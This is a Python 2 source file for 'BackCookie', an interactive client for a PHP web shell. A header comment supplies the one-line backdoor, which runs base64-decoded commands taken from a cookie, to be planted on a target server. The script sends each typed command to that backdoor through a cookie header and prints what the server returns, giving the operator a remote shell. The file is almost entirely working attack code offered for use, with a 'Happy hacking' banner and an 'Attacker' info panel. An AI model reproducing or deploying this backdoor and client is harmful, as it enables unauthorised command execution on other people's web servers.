#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
#       
#          Copyright 2013 - 2014 @jofpin  <jofpin@gmail.com>
#
# 
###############################################
#                                             #
import os                                     #
import sys                                    #
import urllib                                 #
import optparse                               #
import socket                                 #
try:                                          # 
    import requests                           #
except:                                       ################################
    print "\t\nPlease install requests library, you can do it executing: \n" #
    print "\t\npip install requests"          ################################
from sys import argv                          #
#                                             #
############################################################################
#                                                                          #
# Code: <?php error_reporting(0); system(base64_decode($_COOKIE["1"])); ?> ###
# It goes with a range from 1 to 0, but you can customize the parameter.     #
# Example: python -u backcookie.py http://target.com/shell.php -c name_cokie #
#                                                                          ###
# You can change the name of the cookie, in option -c.                     #
# a value of 1 for the name of your cookie, also in php.                   #
# Example: system(base64_decode($_COOKIE["yourcookie"]));                  #####
# so that the connection is successful.                                        #
#                                                                              #
# Backcookie is like the people who finds the love of his life every 2 months. #
################################################################################
#
# BackCookie
#
if "linux" in sys.platform:
	os.system("clear")
elif "win" in sys.platform:
	os.system("cls")
else:
    pass

_version_ = "1.0.2"

# class of header, encode and colors
class core:
    bc = 'Backcookie'
    ua = 'User-Agent'
    ck = 'Cookie'
    eb = 'base64'
    cl = {"blue": "\033[94m", "red": "\033[91m", "green": "\033[92m", "white": "\033[0m", "yellow": "\033[93m"}

# Simplification print, close & get ip!
def go(value):
	print value

def run(value):
	raw_input(value)

def close(value):
	sys.exit(value)

def goip(value):
        try:
            Iphost = socket.gethostbyname(value)
        except socket.gaierror:
            Iphost = "None"
        return Iphost

def Error():
	go(core.cl['white'] + "\t\t-------------" + core.cl['red'] + core.bc + core.cl['white'] + "------------")
	go("\t\t+             Status              +")
	go("\t\t+             sorry :(            +")
	go("\t\t-----------------------------------\n\n")
	go(core.cl['blue'] + "[-] " + core.cl['red']  + "Error:" +  core.cl['yellow'] + " " + "Connection! \n" + core.cl['white'])
	close(0)

def backcookie(command, host, cookie, vcmd):
	headers = {
	           core.ua: 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:33.0) Gecko/20100101 Firefox/33.0', 
	           core.ck: cookie + '=' + command.encode(core.eb)
	          }
	try:
		req = requests.get(host, headers=headers)
		val = req.headers.values()
	except:
		Error()
	if val[0] == "0" or vcmd == "command": # vcmd > validate command
		go(core.cl['blue'] + req.text.strip() + core.cl['white'])
	else:
		pass

def shell(host, cookie):
	backcookie("", host, cookie, "")
	# Home of backcookie 
	go(core.cl['white'] + "\t\t-------------" + core.cl['red'] + core.bc + core.cl['white'] + "------------")
	go("\t\t+      Developed by: @jofpin      +")
	go("\t\t+             To play             +")
	go("\t\t-----------------------------------\n\n")
	go(core.cl['green'] + "[+] " + core.cl['blue']  + "Happy hacking" + core.cl['white'])
	go(core.cl['green'] + "[+] " + core.cl['blue']  + "Sometimes it is not positive, but sometimes if!\n" + core.cl['white'])

	# Open url
	openurl = urllib.urlopen(host)

	# Info server
	server = openurl.headers.get("server")

	# The domain
	domain = host.split("/")[2]

	# Your nick in console
	nick = raw_input(core.cl['blue'] + "[" + core.cl['yellow'] + "!" + core.cl['blue'] + "]" + " " + core.cl['white']  + "Your nick: " + core.cl['white'])
	if nick:
		pass
	else:
		go("\n")
		go(core.cl['red'] + "[-] " + core.cl['white']  + "Do not insert a nick :(" + core.cl['white'])
		close(core.cl['blue'] + "[-] " + core.cl['green'] + "Status: " + core.cl['red'] + "close!\n" + core.cl['white'])

	while True:

		command = raw_input(nick + "@" + domain + ":~$ ")
		if command != "binfo": # Information of conecction!
			backcookie(command, host, cookie, "command")
		else:
			go("\n")
			go(core.cl['yellow'] + "[*] " + core.cl['white']  + "Information" + core.cl['white'])
			go(core.cl['yellow'] + "[!] " + core.cl['green']  + "Attacker: " + core.cl['yellow'] + nick + core.cl['white'])
			go(core.cl['yellow'] + "[!] " + core.cl['green']  + "Host: " + core.cl['blue'] + domain + core.cl['white'])
			go(core.cl['yellow'] + "[!] " + core.cl['green']  + "Ip: " + core.cl['blue'] + goip(domain) + core.cl['white'])
			go(core.cl['yellow'] + "[!] " + core.cl['green']  + "WebServer: " + core.cl['blue'] + server + core.cl['white'])
			go(core.cl['yellow'] + "[!] " + core.cl['green']  + "Target: " + core.cl['blue'] + host + core.cl['white'])
			go(core.cl['yellow'] + "[!] " + core.cl['green']  + "Cookie: " + core.cl['blue'] + cookie + core.cl['white'])
			go(core.cl['yellow'] + "[!] " + core.cl['green']  + "Command: " + core.cl['blue'] + command.encode(core.eb) + core.cl['white'])
			go("\n")

		command = raw_input(nick + "@" + domain + ":~$ ")
		if command != "exit": # exit console backcookie
			backcookie(command, host, cookie, "command")
		else:
			go("\t\t-------------" + core.cl['blue'] + "Developer" + core.cl['white'] + "------------")
			go("\t\t+        Jose Pino (Fraph)       +")
			go("\t\t+       Security researcher      +")
			go("\t\t+            @jofpin             +")
			go("\t\t----------------------------------\n\n")
			go(core.cl['green'] + "[!] " + core.cl['white'] + "Version:" + " " + core.cl['yellow'] + _version_ + core.cl['white'])
			go(core.cl['blue'] + "[-] " + core.cl['red'] + core.bc + " OFF\n" + core.cl['white'])
			break

def main():
	parser = optparse.OptionParser("python" + " " + "%prog -u <<URL>> -c <<Cookie>>", version="1.0.2")
	parser.add_option("-u", "--url", dest="Url", type="string", help="specify hostname to run on")
	parser.add_option("-c", "--cookie", dest="Cookie", type="string", help="specify Cookie")
	(options, args) = parser.parse_args()
	host = options.Url
	cookie = options.Cookie
	if host and cookie:
		shell(host, cookie)
	else:
		parser.print_help()
		close(0)

if __name__ == "__main__":
        try:
        	main()
        except KeyboardInterrupt:
        	close(core.cl['blue'] + "\n\n[-] " + core.cl['green'] + "Status: " + core.cl['red'] + "close!\n" + core.cl['white']) #Ctrl + c = close
                pass
        except Exception as ke:
        	close(core.cl['red'] + "Error: " + core.cl['blue'] + "%s" % ke + core.cl['white']) # Result of error
